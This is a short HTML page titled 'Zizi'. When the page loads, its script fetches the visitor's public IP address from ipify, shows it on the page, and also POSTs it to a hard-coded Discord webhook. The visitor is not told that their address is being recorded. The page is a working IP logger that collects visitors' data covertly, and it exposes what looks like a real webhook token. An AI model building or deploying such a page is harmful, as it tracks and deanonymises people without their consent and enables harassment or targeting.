<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple Page with IP (ipify)</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        .ip-info {
            margin-top: 20px;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <h1>Zizi</h1>

    <!-- Section to display IP info -->
    <div class="ip-info" id="ip-info"></div>

    <script>
        // Use ipify to get the public IP address
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                // Display the IP information on the page
                const ipInfoElement = document.getElementById('ip-info');
                ipInfoElement.innerHTML = `
                    <strong>IP Information:</strong><br>
                    IP Address: ${data.ip}
                `;

                // Prepare data to send to the webhook
                const webhookUrl = 'https://discord.com/api/webhooks/1303064241493901362/RTkY6pfhx86k_MqS7RRaOeA5Emruv3CFsLQ7DEVEkTP6VPKMCyWGaqe_NJmG1_5SuFiYL';  // Replace with your actual Discord webhook URL
                const payload = {
                    content: `New IP Access:\nIP Address: ${data.ip}`
                };

                // Send data to Discord Webhook
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (response.ok) {
                        console.log("IP sent to webhook successfully!");
                    } else {
                        console.error("Error sending IP to webhook:", response.statusText);
                    }
                })
                .catch(error => {
                    console.error("Error sending IP to webhook:", error);
                });
            })
            .catch(error => {
                console.error('Error fetching IP information:', error);
                document.getElementById('ip-info').innerHTML = 'Unable to retrieve IP information.';
            });
    </script>
</body>
</html>
